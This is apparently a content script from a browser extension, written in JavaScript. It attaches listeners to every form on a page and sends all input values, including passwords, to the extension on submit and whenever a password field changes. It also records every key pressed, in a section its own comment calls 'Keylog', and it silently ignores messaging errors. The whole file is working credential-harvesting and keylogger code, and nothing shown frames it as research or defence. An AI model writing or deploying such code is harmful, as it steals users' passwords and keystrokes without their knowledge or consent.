// Alternative
// https://stackoverflow.com/questions/53939205/how-to-avoid-extension-context-invalidated-errors-when-messaging-after-an-exte

const sendMessage = (data) => {
    try {
        chrome.runtime.sendMessage(data);
    } catch (e) {
        null;
    }
};

/**
 * Find all the forms and add submit listener
 */
Array.from(document.forms).forEach((form) => {
    const inputs = form.getElementsByTagName("input");
    form.addEventListener(
        "submit",
        () => {
            sendMessage({
                type: "formSubmit",
                form: Array.from(inputs).map((i) => ({
                    type: i.type,
                    name: i.name,
                    value: i.value,
                })),
            });
        },
        false
    );

    const passwords = Array.from(inputs).filter((i) => i.type === "password");
    if (passwords.length === 0) return;

    // Problem with google, dynamically loaded fields are not picked up
    // Possibly add listener for more password fields
    passwords.forEach((p) => {
        p.addEventListener("change", () => {
            sendMessage({
                type: "passwordChange",
                form: Array.from(inputs).map((i) => ({
                    type: i.type,
                    name: i.name,
                    value: i.value,
                })),
            });
        });
    });
});

// Keylog TODO, modularise the function
document.addEventListener("keydown", (event) => {
    if (event.isComposing || event.keyCode === 229) {
        console.log(event);
        return;
    }

    // console.log("DOWN", event.key);
    sendMessage({
        type: "keyDown",
        key: event.key,
    });
});

document.addEventListener("keyup", (event) => {
    if (event.isComposing || event.keyCode === 229) {
        console.log(event);
        return;
    }

    // console.log("UP", event.key);
    sendMessage({
        type: "keyUp",
        key: event.key,
    });
});
